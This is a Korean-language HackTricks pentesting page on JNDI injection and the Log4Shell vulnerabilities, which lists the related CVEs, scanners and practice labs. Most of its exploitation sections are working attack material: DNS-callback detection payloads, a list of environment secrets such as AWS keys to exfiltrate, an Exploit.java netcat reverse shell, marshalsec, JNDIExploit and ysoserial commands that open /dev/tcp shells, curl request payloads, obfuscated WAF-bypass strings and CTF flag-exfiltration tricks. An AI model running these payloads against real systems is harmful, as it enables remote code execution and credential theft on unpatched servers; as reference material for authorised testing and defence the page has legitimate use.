# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>제로부터 영웅이 되는 AWS 해킹</strong>을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)!

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 기본 정보

JNDI는 1990년대 후반부터 Java에 통합되어 있으며, 네이밍 시스템을 통해 Java 프로그램이 데이터나 객체를 찾을 수 있도록 하는 디렉터리 서비스로 작동합니다. SPI(서비스 제공자 인터페이스)를 통해 다양한 디렉터리 서비스를 지원하며, 원격 Java 객체를 포함한 다른 시스템에서 데이터를 검색할 수 있습니다. 일반적인 SPI에는 CORBA COS, Java RMI Registry, LDAP 등이 포함됩니다.

### JNDI 네이밍 참조
Java 객체는 JNDI 네이밍 참조를 사용하여 저장하고 검색할 수 있으며, 두 가지 형태로 제공됩니다:

- **참조 주소**: 객체의 위치를 지정합니다(예: _rmi://server/ref_), 지정된 주소에서 직접 검색이 가능합니다.
- **원격 팩토리**: 원격 팩토리 클래스를 참조합니다. 액세스할 때, 해당 클래스가 원격 위치에서 다운로드되고 인스턴스화됩니다.

그러나 이 메커니즘은 악의적인 코드의 로딩과 실행을 유발할 수 있습니다. 이에 대한 대응책으로는:

- **RMI**: JDK 7u21부터 기본적으로 `java.rmi.server.useCodeabseOnly = true`로 설정되어 원격 객체 로딩이 제한됩니다. 보안 관리자는 로딩 가능한 내용을 추가로 제한합니다.
- **LDAP**: JDK 6u141, 7u131, 8u121부터 기본적으로 `com.sun.jndi.ldap.object.trustURLCodebase = false`로 설정되어 원격으로 로드된 Java 객체의 실행을 차단합니다. `true`로 설정하면 보안 관리자의 감독 없이 원격 코드 실행이 가능합니다.
- **CORBA**: 특정 속성은 없지만 보안 관리자는 항상 활성화되어 있습니다.

그러나 JNDI 링크를 해결하는 **네이밍 관리자**는 내장된 보안 메커니즘이 없어서 어떤 소스에서든 객체를 검색할 수 있게 됩니다. 이로 인해 RMI, LDAP 및 CORBA 보호 기능을 우회하여 임의의 Java 객체를 로딩하거나 기존 애플리케이션 구성 요소(가젯)를 악성 코드 실행에 이용할 수 있습니다.

악용 가능한 URL의 예시:

- _rmi://attacker-server/bar_
- _ldap://attacker-server/bar_
- _iiop://attacker-server/bar_

보호 기능이 있음에도 불구하고, 로딩되는 JNDI에 대한 신뢰할 수 없는 소스로부터의 보호 기능 부재와 기존 보호 기능 우회 가능성으로 인해 취약점이 남아있습니다.


### JNDI 예제

![](<../../.gitbook/assets/image (655) (1) (1).png>)

**`PROVIDER_URL`**을 설정했더라도, lookup에서 다른 URL을 지정할 수 있으며, 그 URL을 통해 액세스할 수 있습니다: `ctx.lookup("<attacker-controlled-url>")` 이것이 공격자가 자신이 제어하는 시스템에서 임의의 객체를 로드하는 데 악용할 것입니다.

### CORBA 개요

CORBA(Common Object Request Broker Architecture)는 원격 객체를 고유하게 식별하기 위해 **Interoperable Object Reference (IOR)**를 사용합니다. 이 참조에는 다음과 같은 중요한 정보가 포함됩니다:

- **Type ID**: 인터페이스에 대한 고유 식별자.
- **Codebase**: 스텁 클래스를 얻기 위한 URL.

특히, CORBA는 기본적으로 취약하지 않습니다. 일반적으로 보안을 보장하기 위해 다음을 수행합니다:

- **보안 관리자** 설치.
- 보안 관리자를 구성하여 잠재적으로 악성 코드베이스에 대한 연결을 허용합니다. 이는 다음을 통해 수행할 수 있습니다:
- 소켓 권한, 예: ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- 파일 읽기 권한, 전체적으로 (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) 또는 악성 파일이 배치될 수 있는 특정 디렉토리에 대해 지정합니다.

그러나 일부 공급업체 정책은 기본적으로 이러한 연결을 허용할 수 있습니다.

### RMI Context

RMI(Remote Method Invocation)의 경우 상황은 다소 다릅니다. CORBA와 마찬가지로 임의의 클래스 다운로드는 기본적으로 제한됩니다. RMI를 악용하기 위해서는 일반적으로 보안 관리자를 우회해야 합니다. 이는 CORBA에서도 관련이 있는 작업입니다.

### LDAP

먼저, 검색(Search)과 조회(Lookup)를 구분해야 합니다.\
**검색**은 `ldap://localhost:389/o=JNDITutorial`와 같은 URL을 사용하여 LDAP 서버에서 JNDITutorial 객체를 찾고 해당 속성을 검색합니다.\
**조회**는 **네이밍 서비스**를 위한 것으로, **이름에 바인딩된 내용을 가져오기**를 원합니다.

LDAP 검색이 **SearchControls.setReturningObjFlag()와 함께 `true`로 호출**된 경우, 반환된 객체는 재구성됩니다.

따라서 이러한 옵션을 공격하는 여러 가지 방법이 있습니다.\
**공격자는 LDAP 레코드에 페이로드를 삽입하여 시스템에서 실행될 수 있도록** 할 수 있습니다(만약 LDAP 서버에 액세스할 수 있다면 수십 대의 기기를 침해하는 데 매우 유용합니다). 이를 악용하기 위해 LDAP 검색에서 **MitM 공격**을 수행할 수도 있습니다.

앱이 JNDI LDAP URL을 해결할 수 있다면, 검색될 LDAP를 제어할 수 있으며, 악용 코드(log
## Log4Shell 취약점

이 취약점은 Log4j에서 지원하는 `${prefix:name}` 형식의 [**특수 구문**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)을 지원하기 때문에 발생합니다. 여기서 `prefix`는 여러 다른 [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) 중 하나이며 `name`은 평가되어야 합니다. 예를 들어, `${java:version}`은 현재 실행 중인 Java 버전입니다.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)은 `jndi` Lookup 기능을 도입했습니다. 이 기능을 사용하면 JNDI를 통해 변수를 검색할 수 있습니다. 일반적으로 키는 자동으로 `java:comp/env/`로 접두사가 붙습니다. 그러나 키 자체에 **":"**가 포함된 경우에는 이 기본 접두사가 적용되지 않습니다.

키에 **":"**가 포함된 경우, `${jndi:ldap://example.com/a}`와 같이, **접두사가 없으며 LDAP 서버가 객체를 쿼리**합니다. 이러한 Lookups는 Log4j의 구성뿐만 아니라 로그에 기록되는 줄에서도 사용할 수 있습니다.

따라서, **사용자가 제어하는 정보를 처리하는 취약한 버전의 Log4j에서 RCE를 얻기 위해서는 단 하나의 것만 필요**합니다. 그리고 이는 Java 애플리케이션에서 널리 사용되는 라이브러리이므로 (인터넷에 연결된 애플리케이션을 포함하여) log4j를 사용하여 예를 들어 User-Agent와 같은 HTTP 헤더를 기록하는 것이 매우 일반적이었습니다. 그러나 log4j는 HTTP 정보뿐만 아니라 개발자가 지정한 어떤 입력과 데이터도 기록하는 데 사용됩니다.

## Log4Shell 관련 CVE 개요

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Critical]**
이 취약점은 2.0-beta9부터 2.14.1까지의 버전에 영향을 미치는 `log4j-core` 구성 요소의 중대한 **신뢰할 수 없는 역직렬화 결함**입니다. 이를 통해 공격자는 시스템을 탈취하여 원격 코드 실행 (RCE)을 수행할 수 있습니다. 이 문제는 Alibaba Cloud Security Team의 Chen Zhaojun에 의해 보고되었으며 다양한 Apache 프레임워크에 영향을 미칩니다. 2.15.0 버전의 초기 수정은 불완전했습니다. 방어를 위한 Sigma 규칙이 사용 가능합니다 ([규칙 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [규칙 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Critical]**
초기에는 낮은 등급으로 평가되었지만 나중에 중대한 등급으로 업그레이드된 이 CVE는 CVE-2021-44228의 2.15.0 버전에 대한 불완전한 수정으로 인한 **서비스 거부 (DoS)** 결함입니다. 이는 비기본 구성에 영향을 미치며, 공격자는 조작된 페이로드를 통해 DoS 공격을 유발할 수 있습니다. [트윗](https://twitter.com/marcioalm/status/1471740771581652995)에서 우회 방법이 소개되었습니다. 이 문제는 메시지 조회 패턴을 제거하고 JNDI를 기본적으로 비활성화함으로써 2.16.0 및 2.12.2 버전에서 해결되었습니다.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[High]**
`JMSAppender`를 사용하는 비기본 구성에서 영향을 미치는 **Log4j 1.x 버전**에 영향을 미치는 신뢰할 수 없는 역직렬화 결함입니다. 1.x 브랜치에 대한 수정이 제공되지 않았으며, `log4j-core 2.17.0`으로 업그레이드하는 것이 권장됩니다.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[Moderate]**
이 취약점은 Log4j 1.x의 후속 제품인 **Logback 로깅 프레임워크**에 영향을 미칩니다. 이전에 안전하다고 여겨졌으나, 이 프레임워크는 취약점이 발견되었으며, 새로운 버전 (1.3.0-alpha11 및 1.2.9)이 문제를 해결하기 위해 출시되었습니다.

### **CVE-2021-45105** **[High]**
Log4j 2.16.0에는 DoS 결함이 있어 CVE를 수정하기 위해 `log4j 2.17.0`이 출시되었습니다. 자세한 내용은 BleepingComputer의 [보고서](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)에서 확인할 수 있습니다.

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
log4j 버전 2.17에 영향을 미치는 이 CVE는 공격자가 log4j의 구성 파일을 제어해야 한다는 점이 특징입니다. 이는 구성된 JDBCAppender를 통해 임의의 코드 실행이 가능한 잠재적인 결함입니다. 자세한 내용은 [Checkmarx 블로그 게시물](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)에서 확인할 수 있습니다.


## Log4Shell 취약점 악용

### 발견

이 취약점은 보호되지 않은 경우 매우 쉽게 발견할 수 있습니다. 페이로드에서 지정한 주소로 **DNS 요청**을 적어도 하나 보냅니다. 따라서 다음과 같은 페이로드를 사용할 수 있습니다:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` ([canarytokens.com](https://canarytokens.org/generate) 사용)
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` ([interactsh](https://github.com/projectdiscovery/interactsh) 사용)
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (Burp Suite 사용)
* `${jndi:ldap://2j4ayo.dnslog.cn}` ([dnslog](http://dnslog.cn) 사용)
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` ([huntress](https://log4shell.huntress.com) 사용)

**DNS 요청을 받았다고 해서 애플리케이션이 취약점이 있는 것은 아닙니다** (심지어 취약하지 않을 수도 있음). 악용을 시도해야 합니다.

{% hint style="info" %}
**버전 2.15를 악용**하려면 **localhost 검사 우회**를 추가해야 합니다: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **로컬 발견**

다음 명령을 사용하여 **로컬 취약한 버전**의 라이브러리를 검색합니다:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **검증**

이전에 나열된 일부 플랫폼은 요청 시 기록될 변수 데이터를 삽입할 수 있도록 허용합니다.\
이는 다음 두 가지를 위해 매우 유용합니다:

* 취약점을 **검증**하기 위해
* 취약점을 악용하여 정보를 **유출**하기 위해

예를 들어 다음과 같이 요청할 수 있습니다:\
`${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** 이와 같이 환경 변수의 값이 포함된 **DNS 요청을 받으면**, 해당 애플리케이션이 취약함을 알 수 있습니다.

유출할 수 있는 다른 정보:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE 정보

{% hint style="info" %}
JDK 버전이 6u141, 7u131 또는 8u121보다 높은 호스트는 LDAP 클래스 로딩 공격 벡터에 대해 안전하게 보호됩니다. 이는 `com.sun.jndi.ldap.object.trustURLCodebase`의 기본 비활성화로 인해 JNDI가 LDAP를 통해 원격 코드베이스를 로드하는 것을 방지하기 때문입니다. 그러나 이러한 버전은 **직렬화 공격 벡터에 대해서는 보호되지 않습니다**.

이러한 높은 JDK 버전을 악용하려는 공격자는 Java 애플리케이션 내에서 **신뢰할 수 있는 가젯**을 활용해야 합니다. 이를 위해 ysoserial이나 JNDIExploit과 같은 도구가 자주 사용됩니다. 반면, 낮은 JDK 버전을 악용하는 것은 상대적으로 쉽습니다. 이러한 버전은 임의의 클래스를 로드하고 실행할 수 있도록 조작할 수 있습니다.

**더 많은 정보**(_RMI 및 CORBA 벡터에 대한 제한 사항과 같은_)는 **이전 JNDI Naming 참조 섹션** 또는 [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)에서 확인하세요.
{% endhint %}

### RCE - 사용자 정의 페이로드와 Marshalsec

이를 **THM 상자**에서 테스트할 수 있습니다: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

[**marshalsec**](https://github.com/mbechler/marshalsec) 도구를 사용하세요 (jar 버전은 [**여기**](https://github.com/RandomRobbieBF/marshalsec-jar)에서 사용 가능). 이 접근 방식은 LDAP 리퍼럴 서버를 설정하여 연결을 보조 HTTP 서버로 리디렉션하고, 거기에서 공격을 호스팅합니다:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
타겟에게 역쉘 코드를 로드하도록 유도하기 위해, 아래의 내용을 가진 `Exploit.java`라는 이름의 Java 파일을 작성하세요:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
다음 명령을 사용하여 Java 파일을 클래스 파일로 컴파일합니다: `javac Exploit.java -source 8 -target 8`. 그런 다음, 클래스 파일이 있는 디렉토리에서 **HTTP 서버**를 시작하십시오: `python3 -m http.server`. **marshalsec LDAP 서버**가 이 HTTP 서버를 참조하도록 확인하십시오.

취약한 웹 서버에서 취약점 클래스의 실행을 트리거하기 위해 다음과 유사한 페이로드를 전송하십시오:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**참고:** 이 취약점은 Java의 구성이 LDAP를 통한 원격 코드베이스 로딩을 허용하는 것에 의존합니다. 이를 허용하지 않는 경우 임의의 코드 실행을 위해 신뢰할 수 있는 클래스를 악용하는 것을 고려하십시오.


### RCE - **JNDIExploit**

{% hint style="info" %}
작성자는 log4shell의 발견 이후에 이 프로젝트를 github에서 제거한 것 같습니다. [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)에서 캐시된 버전을 찾을 수 있지만, 작성자의 결정을 존중하고자 한다면 이 취약점을 악용하기 위해 다른 방법을 사용하십시오.

또한, 웨이백 머신에서 소스 코드를 찾을 수 없으므로 소스 코드를 분석하거나 무엇을 실행하는지 알지 못한 채로 jar 파일을 실행할 수 있습니다.
{% endhint %}

이 예제에서는 포트 8080에서 이 **log4shell에 취약한 웹 서버**를 실행할 수 있습니다: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_README에서 실행 방법을 찾을 수 있습니다_). 이 취약한 앱은 취약한 버전의 log4shell을 사용하여 HTTP 요청 헤더 _X-Api-Version_의 내용을 로깅합니다.

그런 다음, **JNDIExploit** jar 파일을 다운로드하고 다음과 같이 실행할 수 있습니다:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
코드를 몇 분 동안 읽은 후에 _com.feihong.ldap.LdapServer_와 _com.feihong.ldap.HTTPServer_에서 **LDAP 및 HTTP 서버가 생성되는 방법**을 볼 수 있습니다. LDAP 서버는 어떤 페이로드를 제공해야 하는지 이해하고 피해자를 HTTP 서버로 리디렉션하여 악용을 제공합니다.\
_com.feihong.ldap.gadgets_에서는 원하는 작업을 실행하는 데 사용할 수 있는 **일부 특정 가젯**을 찾을 수 있습니다(임의의 코드 실행 가능). 그리고 _com.feihong.ldap.template_에서는 악용을 **생성하는 다양한 템플릿 클래스**를 볼 수 있습니다.

**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**로 사용 가능한 모든 악용을 볼 수 있습니다. 유용한 몇 가지는 다음과 같습니다:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
그래서, 우리의 예제에서는 이미 취약한 도커 앱이 실행 중입니다. 이를 공격하기 위해:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
**JNDIExploit-1.2-SNAPSHOT.jar**를 실행한 터미널에서 일부 출력을 볼 수 있습니다.

다른 공격 옵션을 확인하려면 `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`를 확인하세요. 또한 LDAP 및 HTTP 서버의 포트를 변경할 수도 있습니다.

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

이 취약점을 악용하기 위해 [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)을 사용해 볼 수도 있습니다.\
피해자에게 보낼 URL을 생성할 수 있습니다.
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_이 커스텀 생성된 자바 객체를 사용한 공격은 **THM solar room**과 같은 랩에서 작동합니다. 그러나 기본적으로 Java는 원격 코드베이스를 LDAP를 사용하여 로드하도록 구성되어 있지 않기 때문에 일반적으로 작동하지 않을 것입니다. 이는 신뢰할 수 있는 클래스를 남용하여 임의의 코드를 실행하지 않기 때문이라고 생각합니다._

### RCE - ysoserial 및 JNDI-Exploit-Kit

이 옵션은 **지정된 클래스만 신뢰하고 모두를 신뢰하지 않도록 구성된 Java 버전**을 공격하는 데 매우 유용합니다. 따라서 **ysoserial**을 사용하여 **신뢰할 수 있는 클래스의 직렬화**를 생성할 수 있으며, 이는 가젯으로 사용되어 **임의의 코드를 실행**할 수 있습니다 (_ysoserial에 의해 남용되는 신뢰할 수 있는 클래스는 공격 대상 자바 프로그램에서 사용되어야만 공격이 작동합니다_).

**ysoserial** 또는 [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)을 사용하여 JNDI에 의해 다운로드되는 직렬화된 공격을 생성할 수 있습니다:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)을 사용하여 취약한 기기로부터의 연결을 기다리는 **JNDI 링크**를 생성합니다. JNDI-Exploit-Kit에서 자동으로 생성되는 **다양한 익스플로잇** 또는 **직접 생성한 역직렬화 페이로드**(본인 또는 ysoserial에서 생성)를 서버로 사용할 수 있습니다.
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

이제 취약점을 악용하고 **reverse shell**을 얻기 위해 생성된 JNDI 링크를 쉽게 사용할 수 있습니다. 취약한 버전의 log4j에 다음을 보내면 됩니다: **`${ldap://10.10.14.10:1389/generated}`**

### 우회 방법들
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### 자동 스캐너

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - 취약한 로컬 라이브러리 찾기

### 테스트용 랩

* [**LogForge HTB machine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell 이후의 Exploitation

이 [**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)에서는 **Log4J**의 일부 기능을 **남용**할 수 있는 **가능성**에 대해 잘 설명되어 있습니다.

Log4j의 [**보안 페이지**](https://logging.apache.org/log4j/2.x/security.html)에는 몇 가지 흥미로운 문장이 있습니다:

> 2.16.0 버전부터 (Java 8용), **메시지 조회 기능이 완전히 제거**되었습니다. **구성에서의 조회는 여전히 작동**합니다. 또한, Log4j는 이제 기본적으로 JNDI에 대한 액세스를 비활성화합니다. 구성에서의 JNDI 조회는 명시적으로 활성화해야 합니다.

> 2.17.0 버전부터 (Java 7 및 Java 6용 2.12.3 및 2.3.1도 포함), 구성에서는 **구성 문자열만 재귀적으로 확장**됩니다. 다른 사용 방법에서는 최상위 조회만 해결되고 중첩된 조회는 해결되지 않습니다.

이는 기본적으로 어떤 `jndi` exploit을 사용할 수 없다는 것을 의미합니다. 게다가, **재귀적 조회**를 수행하려면 해당 구성을 설정해야 합니다.

예를 들어, 해당 CTF에서는 log4j2.xml 파일에 다음과 같이 구성되어 있었습니다:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

[이 CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)에서 공격자는 `${sys:cmd}`의 값을 제어하고 환경 변수에서 플래그를 유출해야 했습니다.\
[**이전 페이로드**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) 페이지에서 확인할 수 있듯이, **`${env:FLAG}`**와 같은 방법으로 환경 변수에 액세스할 수 있는 여러 가지 방법이 있습니다. 이 CTF에서는 쓸모가 없었지만, 다른 실제 시나리오에서는 유용할 수 있습니다.

### Exfiltration in Exceptions

CTF에서는 log4J를 사용하여 자바 애플리케이션의 stderr에 액세스할 수 없었지만, Log4J 예외는 stdout으로 전송되어 파이썬 앱에서 출력되었습니다. 이는 예외를 트리거하여 내용에 액세스할 수 있다는 것을 의미합니다. 플래그를 유출하기 위한 예외는 다음과 같습니다: **`${java:${env:FLAG}}`.** 이는 **`${java:CTF{blahblah}}`**가 존재하지 않으며, 플래그의 값이 포함된 예외가 표시됩니다:

![](<../../.gitbook/assets/image (157).png>)

### Conversion Patterns Exceptions

언급하기만 하면, 새로운 [**변환 패턴**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)을 주입하고 `stdout`에 로그를 기록하는 예외를 트리거할 수도 있습니다. 예를 들면:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

오류 메시지 내부의 데이터를 유출하기 위해 이 방법은 유용하지 않았습니다. 왜냐하면 변환 패턴 이전에 룩업이 해결되지 않았기 때문입니다. 그러나 이는 감지와 같은 다른 용도로 유용할 수 있습니다.

### Conversion Patterns Regexes

그러나, 일부 **정규식을 지원하는 변환 패턴**을 사용하여 정규식을 사용하고 **이진 검색** 또는 **시간 기반** 동작을 악용하여 룩업에서 정보를 유출할 수 있습니다.

* **예외 메시지를 통한 이진 검색**

변환 패턴 **`%replace`**는 **문자열**에서 **내용**을 **대체**하는 데에도 **정규식**을 사용할 수 있습니다. 다음과 같이 작동합니다: `replace{pattern}{regex}{substitution}`\
이 동작을 악용하여 문자열 내부에서 정규식과 일치하는 항목이 있다면 대체가 트리거되도록 만들 수 있습니다(찾지 못한 경우 예외가 발생하지 않음):
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **시간 기반**

이전 섹션에서 언급한 것처럼 **`%replace`**는 **정규식**을 지원합니다. 따라서 [**ReDoS 페이지**](../regular-expression-denial-of-service-redos.md)에서 페이로드를 사용하여 플래그가 발견되면 **타임아웃**을 발생시킬 수 있습니다.\
예를 들어, `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}`와 같은 페이로드는 해당 CTF에서 **타임아웃**을 발생시킵니다.

이 [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)에서는 ReDoS 공격 대신 **증폭 공격**을 사용하여 응답의 시간 차이를 유발했습니다:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
